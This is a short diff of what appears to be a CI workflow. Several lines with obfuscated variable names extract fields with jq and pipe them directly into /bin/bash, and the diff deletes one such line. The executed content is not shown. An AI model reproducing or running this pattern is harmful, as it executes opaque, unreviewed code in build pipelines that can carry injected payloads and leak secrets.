@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$scp48" | jq -r .ekc38067 | /bin/bash
           printf '%s' "$kg960" | jq -r .g8 | /bin/bash
           echo $ia22556 | jq -r .nlb7312 | /bin/bash
-          echo $im45267 | jq -r .ljd51 | /bin/bash
           printf '%s' "$jg799" | jq -r .nxg03 | /bin/bash
 
       - name: Store artifact
